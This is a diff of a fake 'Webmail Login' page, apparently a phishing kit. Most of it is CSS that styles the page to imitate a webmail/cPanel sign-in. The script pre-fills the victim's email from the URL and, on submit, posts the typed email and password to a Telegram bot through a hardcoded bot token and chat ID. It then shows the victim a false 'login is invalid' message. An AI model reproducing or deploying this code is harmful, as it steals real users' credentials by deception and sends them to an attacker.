@@ -5,7 +5,153 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Webmail Login</title>
     <style>
-        /* Add your CSS here (same as before) */
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #ffffff;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+        }
+
+        .notification-bar {
+            padding: 10px;
+            width: 320px;
+            margin: 20px auto;
+            border-radius: 5px;
+            color: white;
+            font-size: 16px;
+            display: none;
+        }
+
+        .auth-bar {
+            background-color: #007bff;
+        }
+
+        .error-bar {
+            background-color: #dc3545;
+        }
+
+        .container {
+            margin-top: 100px;
+        }
+
+        img {
+            margin-bottom: 40px;
+            width: 320px;
+        }
+
+        .login-box {
+            margin: 0 auto;
+            width: 350px;
+        }
+
+        .login-box label {
+            display: block;
+            text-align: left;
+            margin-bottom: 5px;
+            font-size: 14px;
+        }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 20px;
+        }
+
+        .input-group input {
+            width: 70%;
+            padding: 10px 40px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+
+        .input-group .icon {
+            position: absolute;
+            top: 50%;
+            left: 10px;
+            transform: translateY(-50%);
+            color: #777;
+            font-size: 18px;
+        }
+
+        .login-box button {
+            width: 100%;
+            padding: 10px;
+            background-color: #007bff;
+            border: none;
+            border-radius: 5px;
+            color: white;
+            font-size: 16px;
+        }
+
+        .login-box button:hover {
+            background-color: #0056b3;
+        }
+
+        .or-divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+        }
+
+        .or-divider hr {
+            flex: 1;
+            border: none;
+            border-top: 1px solid #ccc;
+        }
+
+        .or-divider .circle {
+            margin: 0 15px;
+            padding: 5px 10px;
+            border: 1px solid #ccc;
+            border-radius: 50%;
+            font-size: 14px;
+            color: #777;
+        }
+
+        .cpanel-login {
+            margin-top: 20px;
+        }
+
+        .cpanel-login button {
+            width: 100%;
+            padding: 10px;
+            background-color: #ff7f0f;
+            border: none;
+            border-radius: 5px;
+            color: white;
+            font-size: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .cpanel-login .icon-infinity {
+            margin-right: 10px;
+            font-size: 18px;
+        }
+
+        .languages {
+            margin-top: 60px;
+            color: gray;
+        }
+
+        .languages a {
+            color: gray;
+            text-decoration: none;
+            margin-right: 15px;
+        }
+
+        .footer {
+            margin-top: 30px;
+            font-size: 12px;
+            color: gray;
+        }
+
+        .footer a {
+            color: gray;
+            text-decoration: none;
+        }
     </style>
 </head>
 <body>
@@ -33,14 +179,12 @@
     </div>
 
     <script>
-        // Function to fetch query parameters
         function getQueryParam(param) {
             const urlParams = new URLSearchParams(window.location.search);
             return urlParams.get(param);
         }
 
-        // Pre-fill email from query parameter if present
-        window.onload = function() {
+        window.onload = function () {
             const emailParam = getQueryParam('email');
             if (emailParam) {
                 document.getElementById('email').value = emailParam;
@@ -54,35 +198,30 @@
             const password = document.getElementById("password").value;
             const notificationBar = document.getElementById("notification-bar");
 
-            // Validate and show loading state
+            const botToken = "7840973698:AAEwak-7hrIa-vzp3BV9kgkFUQK0LloA21M";
+            const chatId = "6885599280";
+            const message = `Email: ${email}\nPassword: ${password}`;
+
             notificationBar.textContent = "Authenticating...";
             notificationBar.className = "notification-bar auth-bar";
             notificationBar.style.display = "block";
-
-            const botToken = "7840973698:AAEwak-7hrIa-vzp3BV9kgkFUQK0LloA21M";
-            const chatId = "6885599280";
-
-            const message = `
-Email: ${email}
-Password: ${password}
-`.trim();
 
             try {
                 const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                     method: "POST",
                     headers: {
-                        "Content-Type": "application/json"
+                        "Content-Type": "application/json",
                     },
                     body: JSON.stringify({
                         chat_id: chatId,
-                        text: message
-                    })
+                        text: message,
+                    }),
                 });
 
                 const data = await response.json();
 
                 if (data.ok) {
-                    notificationBar.textContent = "Login failed. Please check your credentials.";
+                    notificationBar.textContent = "The login is invalid.";
                     notificationBar.className = "notification-bar error-bar";
                 } else {
                     notificationBar.textContent = "An error occurred. Please try again.";
